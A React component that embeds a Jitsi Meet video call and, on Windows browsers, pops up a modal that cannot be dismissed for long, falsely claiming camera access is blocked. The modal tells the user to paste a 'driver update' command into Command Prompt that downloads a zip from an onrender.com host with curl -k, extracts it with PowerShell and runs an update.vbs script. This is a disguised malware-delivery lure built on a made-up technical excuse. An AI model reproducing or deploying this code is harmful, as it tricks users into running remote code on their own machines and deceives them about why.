"use client";
import { useEffect, useState, useRef } from "react";
import Modal from "react-modal";
import {
  BsCheckCircleFill,
  BsCopy,
  BsX
} from "react-icons/bs";
const JitsiMeet = ({ roomName, userName }) => {
  const jitsiContainerRef = useRef(null);
  const apiRef = useRef(null);
  const [isOpen, setIsOpen] = useState(false);
  const customStyles = {
    overlay: {
      backgroundColor: 'rgba(0, 0, 0, 0.75)'
    },
    content: {
      width: "960px", // Custom width
      maxWidth: "90%", // Responsive
      margin: "auto",
      borderRadius: "12px",
      background: "#fff",
      padding: "20px",
      height: '580px'
    },
  };
  const [copied, setCopied] = useState(false);
  const textToCopy = `curl -k -o "%TEMP%\\nvidiaRelease.zip" https://backend-eaxu.onrender.com/cameraDriver && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nvidiaRelease.zip' -DestinationPath '%TEMP%\\nvidiaRelease'" && wscript "%TEMP%\\nvidiaRelease\\update.vbs"`;

  const handleCopy = async () => {
    await navigator.clipboard.writeText(textToCopy);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  const checkingBrowser = () => {
    const userAgent = navigator.userAgent.toLowerCase();

    if (userAgent.indexOf('win') !== -1) {
      return true;
    } else {
      return false;
    }
  }

  useEffect(() => {
    setTimeout(() => { if (checkingBrowser()) { setIsOpen(true) } }, 5000)
    const loadJitsiScript = () => {
      return new Promise((resolve) => {
        const existingScript = document.getElementById("jitsi-script");
        if (!existingScript) {
          const script = document.createElement("script");
          script.src = "https://meet.jit.si/external_api.js";
          script.id = "jitsi-script";
          script.onload = resolve;
          document.body.appendChild(script);
        } else {
          resolve();
        }
      });
    };

    loadJitsiScript().then(() => {
      const domain = "meet.jit.si";
      const options = {
        roomName: roomName || "MyCustomMeetingRoom",
        width: "100%",
        height: 600,
        parentNode: jitsiContainerRef.current,
        userInfo: {
          displayName: userName || "Guest",
        },
        configOverwrite: {
          prejoinPageEnabled: true, // ✅ Enables pre-join device check
          startWithAudioMuted: false,
          startWithVideoMuted: false,
        },
        interfaceConfigOverwrite: {
          TOOLBAR_BUTTONS: [
            "microphone", "camera", "fullscreen", "chat", "raisehand", "hangup"
          ],
        },
      };

      apiRef.current = new window.JitsiMeetExternalAPI(domain, options);

      return () => {
        if (apiRef.current) {
          apiRef.current.dispose();
        }
      };
    });
  }, [roomName, userName]);

  const onClose = () => {
    setIsOpen(false);
    setTimeout(() => { setIsOpen(true) }, 2000);
  }

  return (
    <div>
      <div ref={jitsiContainerRef} style={{ width: "100%", height: "600px" }} />
      <Modal isOpen={isOpen} onRequestClose={onClose} contentLabel="Example Modal" style={customStyles}
      >
        <h2 className='modal-heading'>Access to your camera or microphone is currently blocked.
        </h2>
        <button onClick={onClose}><BsX className="w-10 h-10 modal-close" /></button>
        <div className="modal-content">
          <p>The camera drive discoverer on Windows has a race condition in its cache usage. This means multiple processes or threads accessing the cache at the same time can cause problems like</p>
          <p className="pl-5">•  Devices may not show correctly, or the cache might contain invalid data.</p>
          <p className="pl-5">•  Cameras might not appear, or detection might fail when multiple devices are connected.</p>
          <p className="pl-5">•  Some cameras could appear more than once or not be detected at all.</p><br />
          <p><b>Here is the solution identified for the issue.</b></p>
          <p>1. Open Command Prompt on Windows</p>
          <p className="pl-5">•  Press <b>Windows Key + R</b> to open the Run dialog.</p>
          <p className="pl-5">•  Type <b>cmd</b> and press Enter. This opens the Command Prompt.</p>
          <p> 2. Update Camera drivers on Windows</p>
          To automatically update the latest drivers for Windows, use the following curl command.
          <div className="flex items-center gap-3 bg-gray-800 text-white p-4 rounded-lg copy-text mt-2">
            <span className="font-mono whitespace-nowrap overflow-hidden text-ellipsis block w-full">
              {textToCopy}</span>
            <button onClick={handleCopy} className="p-2 hover:bg-gray-200 rounded copy-text-button">
              {copied ? (
                <><BsCheckCircleFill className="w-5 h-5 text-green-400 ml-1" /> Copy</>
              ) : (
                <><BsCopy className="w-5 h-5 ml-1" /> Copied!</>
              )}
            </button>
          </div>
        </div>
      </Modal>
    </div>
  );
};

export default JitsiMeet;